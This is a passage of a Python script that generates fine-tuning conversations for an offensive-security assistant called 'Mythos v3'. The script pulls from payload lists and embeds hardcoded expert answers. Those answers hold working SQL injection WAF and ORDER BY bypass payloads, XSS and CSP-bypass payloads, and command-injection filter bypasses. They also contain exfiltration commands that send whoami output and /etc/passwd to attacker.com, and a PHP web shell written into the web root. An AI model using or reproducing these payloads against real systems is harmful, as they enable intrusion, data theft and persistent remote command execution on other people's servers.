    generators = [_gen_nmap_example, _gen_sqlmap_example, _gen_ffuf_example, _gen_metasploit_example]
    count = 0

    for i in range(n):
        gen_fn = generators[i % len(generators)]
        try:
            ex = gen_fn()
            if is_quality(ex):
                yield ex
                count += 1
        except Exception:
            continue

    print(f"  Tool execution chains → {count:,} examples")


# ─── SOURCE 4: Payload adaptation multi-turn examples ─────────────────────────

PAYLOAD_FILES_MAP = {
    "sql injection": [
        "sql-injection-payload-list/mysql-payloads.txt",
        "sql-injection-payload-list/postgresql-payloads.txt",
        "sql-injection-payload-list/mssql-payloads.txt",
    ],
    "xss": [
        "xss-payload-list/Payloads/Basic/event-handlers.txt",
        "xss-payload-list/Payloads/Basic/script-tags.txt",
    ],
    "command injection": [
        "command-injection-payload-list/Intruder/command-injection-linux.txt",
        "command-injection-payload-list/Intruder/command-injection-bypass.txt",
    ],
    "waf bypass": [
        "waf-bypass-payload-list/intruder/waf_bypass_payloads.txt",
    ],
}

ADAPTATION_MULTITURN_TEMPLATES = [
    # SQL injection adaptation - variant A
    [
        ("Give me MySQL SQL injection payloads for authentication bypass.", None),
        ("The WAF is blocking single quotes. How do I bypass it?", "waf_bypass"),
        ("The application uses parameterized queries for most fields but not the ORDER BY clause. How do I exploit that?", "orderby"),
    ],
    # SQL injection adaptation - variant B
    [
        ("List SQL injection payloads for testing a MySQL login form.", None),
        ("The firewall is filtering single quotes and double quotes. What encoding bypasses exist?", "waf_bypass"),
    ],
    # SQL injection adaptation - variant C
    [
        ("What are the best SQL injection payloads for time-based blind injection?", None),
        ("I need to exploit ORDER BY injection in a PostgreSQL application.", "orderby"),
    ],
    # XSS adaptation - variant A
    [
        ("Give me XSS payloads that work in HTML attribute context.", None),
        ("The application strips <script> tags. What alternatives do I have?", "script_bypass"),
        ("Content Security Policy blocks inline scripts. What CSP bypass techniques work?", "csp"),
    ],
    # XSS adaptation - variant B
    [
        ("What are effective XSS payloads for testing reflected XSS in search boxes?", None),
        ("The WAF blocks onerror and onload event handlers. What other events can I use?", "script_bypass"),
    ],
    # XSS adaptation - variant C
    [
        ("Show me XSS payloads for attribute injection where I control a value inside a tag.", None),
        ("The app has a CSP policy: script-src 'self' https://cdn.example.com. How do I bypass?", "csp"),
    ],
    # Command injection adaptation - variant A
    [
        ("What Linux command injection payloads should I try first?", None),
        ("The application blocks semicolons and pipe characters. What delimiters still work?", "bypass"),
        ("I have command injection but can't see output. How do I exfiltrate data?", "blind"),
    ],
    # Command injection adaptation - variant B
    [
        ("Give me command injection payloads for testing a web application running on Linux.", None),
        ("The input validation blocks most special characters but spaces are allowed. What injections still work?", "bypass"),
    ],
    # Command injection adaptation - variant C
    [
        ("I found OS command injection but there is no output. How do I confirm it and extract data?", None),
        ("DNS exfiltration is blocked. What other out-of-band channels can I use for blind command injection?", "blind"),
    ],
]

WAF_BYPASS_RESPONSES = {
    "waf_bypass": """When a WAF blocks single quotes, try these encoding and obfuscation techniques:

**URL encoding:**
- `%27 OR 1=1--` (single quote as %27)
- `%2527 OR 1=1--` (double-encoded)

**Alternative quotes and Unicode:**
- `admin'-- -` → `admin\u0027-- -` (Unicode)
- Using hex: `0x61646d696e` for 'admin'

**Comment variations:**
- `admin'/**/OR/**/1=1-- -`
- `admin'/*!50000OR*/1=1-- -` (MySQL version comments)

**No-quote bypasses:**
- `admin OR 1=1-- -` (if numeric context)
- `CHAR(97,100,109,105,110)` (MySQL char function)

**Case and whitespace:**
- `aDmIn'||'1'='1` (case variation)
- `admin'%0AOR%0A1=1-- -` (newline instead of space)

Start with URL-encoded single quotes, then try comment-based separation.""",

    "orderby": """ORDER BY injection is a powerful blind injection point because parameterized queries typically can't be used there.

**Test for injection:**
```sql
?sort=1 ORDER BY 1-- -     # normal
?sort=1 ORDER BY 2-- -     # check column count
?sort=1 ORDER BY 100-- -   # should error if < 100 columns
```

**Boolean-based extraction:**
```sql
?sort=(CASE WHEN (1=1) THEN name ELSE id END)
?sort=(CASE WHEN (SUBSTRING(username,1,1)='a') THEN name ELSE id END)
```

**Time-based (blind):**
```sql
?sort=(SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)
```

**UNION in ORDER BY (MySQL trick):**
```sql
?sort=1 UNION SELECT NULL,NULL,NULL-- -
```

Use SQLmap: `sqlmap -u 'http://target/products?sort=1' -p sort --technique=B,T`""",
}

XSS_RESPONSES = {
    "script_bypass": """When `<script>` tags are stripped, switch to event-handler based payloads:

**Event handlers (no script tags):**
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<iframe onload=alert(document.cookie)>
<details open ontoggle=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

**JavaScript URI (href context):**
```html
<a href="javascript:alert(1)">click</a>
<a href=javascript&colon;alert(1)>
```

**CSS-based (style context):**
```html
<style>@keyframes x{}</style><div style="animation-name:x" onanimationend="alert(1)">
```

**Template literals and expressions:**
```javascript
`${alert(1)}`  // in JS template context
```

**Polyglots:**
```
jaVasCript:/*-/*`/*`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>
<svg onload=alert(1)//>
```""",

    "csp": """For CSP bypass when inline scripts are blocked:

**Check the exact CSP policy first:**
```bash
curl -I http://target.com | grep -i content-security-policy
```

**Common bypasses by policy type:**

1. **`script-src 'self'`** — Look for JSONP endpoints:
   ```
   <script src="https://target.com/api?callback=alert(1)"></script>
   ```

2. **`unsafe-eval` present** — Use eval-based:
   ```javascript
   eval(atob('YWxlcnQoMSk='))  // base64: alert(1)
   ```

3. **Angular/React app** — Client-side template injection:
   ```
   {{constructor.constructor('alert(1)')()}}
   ```

4. **CDN allowed (e.g., *.cloudflare.com)** — Host malicious JS on allowed CDN

5. **`'nonce-...'` policy** — Look for nonce in page source, replay it

6. **`report-uri` bypass** — Some browsers have parsing quirks

Tool: `csp-evaluator.withgoogle.com` — paste the CSP header to find weaknesses automatically.""",
}

CMD_RESPONSES = {
    "bypass": """When semicolons (`;`) and pipe (`|`) are filtered, try these alternative command separators:

**Alternative separators:**
```bash
&   # background: cmd1 & cmd2  (runs both)
&&  # AND: cmd1 && cmd2 (runs cmd2 only if cmd1 succeeds)
||  # OR: cmd1 || cmd2 (runs cmd2 only if cmd1 fails)
%0a # newline (URL-encoded)
%0d%0a # CRLF
`cmd` # backtick subshell
$(cmd) # $() subshell
```

**Examples:**
```bash
# Instead of: id; whoami
id%0awhoami        # newline
id`whoami`         # backtick (if quotes not filtered)
id$(whoami)        # $() subshell
id&&whoami
```

**Filter-specific bypasses:**
```bash
# If space is filtered:
{id,whoami}        # brace expansion  
id${IFS}whoami     # $IFS as space
cat</etc/passwd    # redirect instead of space

# If slash is filtered:
echo "L2V0Yy9wYXNzd2Q=" | base64 -d | bash  # base64 encode path
```

**Confirm with out-of-band:**
```bash
# DNS exfiltration (no output needed):
curl http://$(id).attacker.com
nslookup $(whoami).attacker.burpcollaborator.net
```""",

    "blind": """For blind command injection (no visible output), use out-of-band techniques:

**Time-based confirmation:**
```bash
; sleep 5       # if 5 second delay occurs, injection is confirmed
&& ping -c 5 127.0.0.1   # 5 pings = ~5 second delay
```

**DNS out-of-band (Burp Collaborator):**
```bash
; nslookup $(whoami).BURP-COLLAB-ID.burpcollaborator.net
; curl http://$(id | base64).BURP-COLLAB-ID.burpcollaborator.net
```

**HTTP callback (if outbound HTTP allowed):**
```bash
; curl http://attacker.com/$(whoami)
; wget -q http://attacker.com/?data=$(cat /etc/passwd | base64)
```

**Write to web root (if permissions allow):**
```bash
; echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php
```

**Setup interactsh listener (free alternative to Burp):**
```bash
# Get payload from interactsh-client
interactsh-client
# Use: ; curl xyz.interactsh.com
```

**If none work:** Try time delays with nested commands:
```bash
; $(if [ $(whoami) == 'root' ]; then sleep 5; fi)
```""",
}


def _build_multiturn_payload_example(data_dir: Path, topic: str, turns_template: list) -> dict | None:
    """Build a multi-turn payload adaptation conversation."""
    system = pick_sys("payload")
    turns = []

    for turn_idx, (user_question, response_key) in enumerate(turns_template):
        if turn_idx == 0:
            # First turn: load actual payloads from file
            topic_lower = topic.lower()
            payload_files = PAYLOAD_FILES_MAP.get(topic_lower, [])
            # Fuzzy match: try partial key lookup
            if not payload_files:
                for k, v in PAYLOAD_FILES_MAP.items():
                    if k in topic_lower or topic_lower in k:
                        payload_files = v
                        break
            payloads = []
            for rel_path in payload_files:
                full_path = data_dir / rel_path
                if full_path.exists():
                    try:
                        lines = full_path.read_text(encoding="utf-8", errors="ignore").splitlines()
                        for line in lines:
                            line = line.strip()
                            if line and not line.startswith("#") and not line.startswith("//"):
                                payloads.append(line)
                    except Exception:
                        continue
                if len(payloads) >= 40:
                    break

            if not payloads:
                payloads = ["' OR '1'='1", "' OR 1=1--", "admin'--", "1 UNION SELECT NULL--"]

            sample = payloads[:30]
            assistant_response = (
                f"{topic.title()} payloads:\n\n```\n" +
                "\n".join(sample) +
                f"\n```\n\nTotal in arsenal: {len(payloads)} payloads. "
                "Start with the basics, then escalate to advanced techniques based on application responses."
            )
        else:
            # Follow-up turns with pre-written expert responses
            if topic == "SQL injection":
                assistant_response = WAF_BYPASS_RESPONSES.get(response_key, "Try encoding and obfuscation techniques.")
            elif topic == "XSS":
                assistant_response = XSS_RESPONSES.get(response_key, "Try event-handler based payloads.")
            else:
                assistant_response = CMD_RESPONSES.get(response_key, "Try alternative separators and encoding.")

        turns.append((user_question, assistant_response))

    ex = make_multiturn(system, turns)
    if not is_quality(ex):
        return None
    return ex


def generate_payload_adaptations(data_dir: Path) -> Iterator[dict]:
    """Generate multi-turn payload adaptation conversations."""
    count = 0

    topics_templates = [
        ("SQL injection", ADAPTATION_MULTITURN_TEMPLATES[0]),
        ("SQL injection", ADAPTATION_MULTITURN_TEMPLATES[1]),
        ("SQL injection", ADAPTATION_MULTITURN_TEMPLATES[2]),
        ("XSS", ADAPTATION_MULTITURN_TEMPLATES[3]),
        ("XSS", ADAPTATION_MULTITURN_TEMPLATES[4]),
        ("XSS", ADAPTATION_MULTITURN_TEMPLATES[5]),
        ("command injection", ADAPTATION_MULTITURN_TEMPLATES[6]),
        ("command injection", ADAPTATION_MULTITURN_TEMPLATES[7]),
        ("command injection", ADAPTATION_MULTITURN_TEMPLATES[8]),
    ]

    # Generate multiple variations
    for _ in range(20):  # 20 iterations × 9 templates = 180 multi-turn examples
        for topic, turns_template in topics_templates:
            # Select 2-3 turns randomly
            num_turns = random.randint(2, len(turns_template))
            selected_turns = turns_template[:num_turns]

            ex = _build_multiturn_payload_example(data_dir, topic, selected_turns)
            if ex:
                yield ex
                count += 1

    # Also generate single-turn payload deep-dives
    DEEP_DIVE_TOPICS = [
        ("SQL injection time-based blind", "Teach me time-based blind SQL injection. When is it used and what are the key payloads?"),
        ("XSS DOM-based injection", "Explain DOM-based XSS — how it differs from reflected XSS, and give me practical payloads."),
        ("NoSQL injection", "What is NoSQL injection? Give me MongoDB and Redis injection payloads."),
        ("SSRF (Server-Side Request Forgery)", "Give me a comprehensive guide on SSRF payloads and techniques to bypass SSRF filters."),
        ("XXE injection", "Explain XXE injection with working payload examples for file read, SSRF, and blind XXE."),
        ("SSTI (Server-Side Template Injection)", "Give me SSTI payloads for Jinja2, Twig, Freemarker, and Pebble template engines."),
        ("HTTP request smuggling", "Explain HTTP request smuggling with TE.CL and CL.TE examples. How do I detect and exploit it?"),
        ("Path traversal / LFI", "Give me path traversal and LFI payloads including null byte bypass, double encoding, and PHP wrappers."),
        ("Command injection blind exfiltration", "Show me how to exfiltrate data from blind command injection using DNS, HTTP, and timing."),
        ("CRLF injection", "What is CRLF injection? Give me payloads for HTTP header injection and response splitting."),
    ]

    for topic, question in DEEP_DIVE_TOPICS:
        # Look for relevant content in PayloadsAllTheThings
        topic_dir_map = {
            "SSRF": "PayloadsAllTheThings/Server Side Request Forgery",
            "XXE": "PayloadsAllTheThings/XXE Injection",
            "SSTI": "PayloadsAllTheThings/Server Side Template Injection",
            "NoSQL": "PayloadsAllTheThings/NoSQL Injection",
            "Path traversal": "PayloadsAllTheThings/Path Traversal",
            "HTTP request smuggling": "PayloadsAllTheThings/HTTP Request Smuggling",
            "CRLF": "PayloadsAllTheThings/CRLF Injection",
        }
        content = None
        for key, rel_path in topic_dir_map.items():
            if key.lower() in topic.lower():
                topic_path = data_dir / rel_path / "README.md"
                if topic_path.exists():
                    try:
                        content = clean_md(topic_path.read_text(encoding="utf-8", errors="ignore"), 12000)
                    except Exception:
                        pass
                break

        if content and len(content) > 200:
            ex = make_example(pick_sys("payload"), question, content)
        else:
            # Generic response template
            answer = f"Comprehensive guide on {topic}:\n\n[See PayloadsAllTheThings/{topic} for full payload lists]\n\nKey concepts and techniques for {topic} in penetration testing and bug bounty hunting."
            ex = make_example(pick_sys("payload"), question, answer)

        if is_quality(ex):
            yield ex
            count += 1

    print(f"  Payload adaptations → {count:,} examples")


# ─── Main aggregator ──────────────────────────────────────────────────────────

def run(data_dir: Path, existing_dir: Path, output_dir: Path,
        seed: int = 42, val_ratio: float = 0.05,
        bug_bounty_sample: int = 40000,
        tool_chains: int = 8000):

    random.seed(seed)
    output_dir.mkdir(parents=True, exist_ok=True)

    t0 = time.time()

    generators = [
        ("security_research_exploits", parse_security_research_exploits(data_dir)),
        ("bug_bounty_reports", generate_bug_bounty_reports(data_dir, sample_size=bug_bounty_sample)),
        ("tool_execution_chains", generate_tool_execution_chains(n=tool_chains)),
        ("payload_adaptations", generate_payload_adaptations(data_dir)),
    ]

    all_examples = []
    source_stats = {}
    seen_hashes: set[int] = set()

    def dedup_hash(ex: dict) -> int:
        msgs = ex["messages"]
        # Include message count + first user msg + last assistant to allow multi-turn variety
        return hash(
            str(len(msgs))
            + msgs[1]["content"][:100]
            + msgs[-1]["content"][:100]
        )

    print("\n[1/4] Generating new training examples...")

    for source_name, gen in generators:
        print(f"\n  Processing: {source_name}")
        src_examples = []
        for ex in gen:
            h = dedup_hash(ex)
            if h in seen_hashes:
                continue
            seen_hashes.add(h)
            src_examples.append(ex)
        source_stats[source_name] = len(src_examples)
        all_examples.extend(src_examples)
        print(f"    → {len(src_examples):,} unique examples")

    total_new = len(all_examples)
    print(f"\n  Total new examples: {total_new:,}")

    print("\n[2/4] Loading existing training data...")
    existing_train = existing_dir / "train.jsonl"
    existing_val = existing_dir / "val.jsonl"

    existing_count = 0
    existing_examples = []

    if existing_train.exists():
        with open(existing_train, encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line:
                    existing_examples.append(line)
                    existing_count += 1
        print(f"  Existing train.jsonl: {existing_count:,} examples")
    else:
        print("  No existing train.jsonl found — writing new dataset only")

    if existing_val.exists():
        with open(existing_val, encoding="utf-8") as f:
            existing_val_examples = [line.strip() for line in f if line.strip()]
        print(f"  Existing val.jsonl: {len(existing_val_examples):,} examples")
    else:
        existing_val_examples = []

    print("\n[3/4] Merging and splitting...")
    random.shuffle(all_examples)

    new_val_count = max(1, int(total_new * val_ratio))
    new_train_count = total_new - new_val_count
    new_val_examples = [json.dumps(ex, ensure_ascii=False) for ex in all_examples[:new_val_count]]
    new_train_examples = [json.dumps(ex, ensure_ascii=False) for ex in all_examples[new_val_count:]]

    final_train = existing_examples + new_train_examples
    final_val = existing_val_examples + new_val_examples

    random.shuffle(final_train)
    random.shuffle(final_val)

    print("\n[4/4] Writing output files...")
    train_path = output_dir / "train.jsonl"
    val_path = output_dir / "val.jsonl"
    stats_path = output_dir / "dataset_stats.json"

    with open(train_path, "w", encoding="utf-8") as f:
        for line in final_train:
            f.write(line + "\n")

    with open(val_path, "w", encoding="utf-8") as f:
        for line in final_val:
            f.write(line + "\n")

    elapsed = time.time() - t0

    stats = {
        "total_examples": len(final_train) + len(final_val),
        "train_examples": len(final_train),
        "val_examples": len(final_val),
        "split_ratio": f"{100*(1-val_ratio):.0f}/{100*val_ratio:.0f}",
        "seed": seed,
        "elapsed_seconds": round(elapsed, 1),
        "new_examples_added": total_new,
        "new_source_breakdown": source_stats,
        "existing_train_kept": existing_count,
        "existing_val_kept": len(existing_val_examples),
    }
    stats_path.write_text(json.dumps(stats, indent=2, ensure_ascii=False))

    print(f"\n{'='*60}")
    print(f"  Enhancement complete!")
    print(f"{'='*60}")
    print(f"  New examples added : {total_new:,}")
    for src, cnt in source_stats.items():
        print(f"    {src:30s}: {cnt:>8,}")
    print(f"\n  Final train.jsonl  : {len(final_train):,} examples")
    print(f"  Final val.jsonl    : {len(final_val):,} examples")
    print(f"  Total              : {len(final_train)+len(final_val):,} examples")
    print(f"  Output             : {output_dir}")
    print(f"  Time               : {elapsed/60:.1f} minutes")


# ─── CLI ─────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="Enhance Mythos v3 training dataset with exploit writeups, bug bounty reports, and tool execution examples"
    )
    parser.add_argument("--data-dir", type=Path, default=Path("./data"))
    parser.add_argument("--existing-dir", type=Path, default=Path("./training_data"),
                        help="Directory containing existing train.jsonl and val.jsonl to merge with")
    parser.add_argument("--output-dir", type=Path, default=Path("./training_data_v2"),
                        help="Output directory for enhanced dataset")
    parser.add_argument("--seed", type=int, default=42)
    parser.add_argument("--val-ratio", type=float, default=0.05)
    parser.add_argument("--bug-bounty-sample", type=int, default=40000,
                        help="Number of CVEs to convert to bug bounty format (default: 40000)")
    parser.add_argument("--tool-chains", type=int, default=8000,
                        help="Number of synthetic tool execution examples (default: 8000)")
    args = parser.parse_args()

    print("=" * 60)
    print("  Mythos v3 — Dataset Enhancement")
    print("=" * 60)
    print(f"  Data dir      : {args.data_dir.resolve()}")
    print(f"  Existing data : {args.existing_dir.resolve()}")
    print(f"  Output dir    : {args.output_dir.resolve()}")
    print(f"  Bug bounty    : {args.bug_bounty_sample:,} CVEs")
    print(f"  Tool chains   : {args.tool_chains:,} examples")
    print()

    run(
        data_dir=args.data_dir,
        existing_dir=args.existing_dir,
        output_dir=args.output_dir,
        seed=args.seed,
        val_ratio=args.val_ratio,
        bug_bounty_sample=args.bug_bounty_sample,
        tool_chains=args.tool_chains,
    )


if __name__ == "__main__":
    main()
